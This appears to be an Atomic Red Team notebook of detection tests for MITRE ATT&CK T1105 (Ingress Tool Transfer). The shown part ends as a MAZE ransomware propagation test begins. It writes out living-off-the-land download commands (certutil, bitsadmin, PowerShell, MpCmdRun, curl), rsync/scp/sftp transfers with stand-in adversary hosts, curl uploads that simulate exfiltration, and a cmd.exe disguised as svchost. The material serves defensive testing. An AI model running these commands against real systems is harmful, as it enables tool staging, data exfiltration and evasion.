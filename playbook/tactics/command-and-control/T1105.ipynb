{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0aa64da2",
   "metadata": {},
   "source": "# T1105 - Ingress Tool Transfer\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts.\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)"
  },
  {
   "cell_type": "markdown",
   "id": "a5c39426",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "08aa4f00",
   "metadata": {},
   "source": "### Atomic Test #1 - rsync remote file copy (push)\nUtilize rsync to perform a remote file copy (push)\n\n**Supported Platforms:** linux, macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: rsync must be installed on the machine \n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\n(pkg install -y rsync)||(sudo apt-get -y install rsync)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1aa22ea0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f97d950d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nrsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "09fbd7da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a2640aa9",
   "metadata": {},
   "source": "### Atomic Test #2 - rsync remote file copy (pull)\nUtilize rsync to perform a remote file copy (pull)\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: rsync must be installed on the machine \n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\n(pkg install -y rsync)||(sudo apt-get -y install rsync)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc6d7e53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "95ebf79f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nrsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73d19af2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b6b66e50",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - scp remote file copy (push)",
    "Utilize scp to perform a remote file copy (push)\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nscp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e91a0d72",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "914fdd29",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - scp remote file copy (pull)",
    "Utilize scp to perform a remote file copy (pull)\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nscp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dfb4d3e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "903f07af",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - sftp remote file copy (push)",
    "Utilize sftp to perform a remote file copy (push)\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ebe5adb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f029743e",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - sftp remote file copy (pull)",
    "Utilize sftp to perform a remote file copy (pull)\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "695c9640",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "4acfc645",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - certutil download (urlcache)",
    "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd9b810f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "30ade14d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel Atomic-license.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8229371",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "03643049",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - certutil download (verifyctl)",
    "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a2fd2660",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "f3fd0808",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "311ba17b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c93b181a",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Windows - BITSAdmin BITS Download",
    "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "33585629",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "2ed7a5c8",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Windows - PowerShell Download",
    "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60aa584b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "96a63cde",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\Atomic-license.txt -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4111f661",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "90f05dd8",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - OSTAP Worming Activity",
    "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\npushd \\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca47a602",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "5970484b",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - svchost writing a file to a UNC path",
    "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "241ab6b6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "f49a040b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7f16b81",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "39593c63",
   "metadata": {},
   "source": "### Atomic Test #13 - Download a File with Windows Defender MpCmdRun.exe\nUses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Must have a Windows Defender version with MpCmdRun.exe installed\n##### Check Prereq Commands:\n```cmd\ncd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  >nul 2>&1\n\n```\n##### Get Prereq Commands:\n```cmd\nEcho \"A version of Windows Defender with MpCmdRun.exe must be installed manually\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15d004f6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 13 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "05430fa1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d5da953",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "f4a57659",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\Atomic-license.txt >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0dd240c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9e5fbe6b",
   "metadata": {},
   "source": "### Atomic Test #14 - whois file download\nDownload a remote file using the whois utility\n\n**Supported Platforms:** linux, macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: The whois and timeout commands must be present\n\n##### Check Prereq Commands:\n```sh\nwhich whois && which timeout\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Please install timeout and the whois package\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a6d8ae3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 14 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "782defa9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntimeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "236f6097",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "990835e5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1105.whois.out\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9d7f5d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ca4a2472",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - File Download via PowerShell",
    "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f010b6e0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "714a9158",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - File download with finger.exe on Windows",
    "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nfinger base64_filedata@localhost\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "017e1287",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "19f9aefa",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Download a file with IMEWDBLD.exe",
    "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b420e8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "f9f45aa8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c73b8169",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f3f4e423",
   "metadata": {},
   "source": "### Atomic Test #18 - Curl Download File\nThe following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Curl must be installed on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path C:\\Windows\\System32\\Curl.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "02bd45c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 18 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fb47854b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "388b72bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "d2f44aa7",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39f07439",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 18 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eeea61bb",
   "metadata": {},
   "source": "### Atomic Test #19 - Curl Upload File\nThe following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Curl must be installed on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path C:\\Windows\\System32\\Curl.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n\n```\n##### Description: A file must be created to upload\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path c:\\temp\\atomictestfile.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\necho \"This is an Atomic Test File\" > c:\\temp\\atomictestfile.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59304a45",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 19 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1663fb6f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "501dc0ef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "c7fab14a",
   "metadata": {},
   "source": "### Atomic Test #20 - Download a file with Microsoft Connection Manager Auto-Download\nUses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: #{Path_to_file} must exist on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1105\\src\\T1105.bat\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1105\\src\\T1105.bat\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat\" -OutFile \"PathToAtomicsFolder\\T1105\\src\\T1105.bat\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "123d45c2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 20 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "0b550366",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\T1105\\src\\T1105.bat\" 1>NUL \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1eac2db8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "7c0cbea1",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "154f5c8b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 20 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b4970311",
   "metadata": {},
   "source": "### Atomic Test #21 - MAZE Propagation Script\nThis test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Binary file must exist at specified location (#{binary_file})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:comspec) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nwrite-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n\n```\n##### Description: Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fa4e48f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 21 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8c52ce1f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
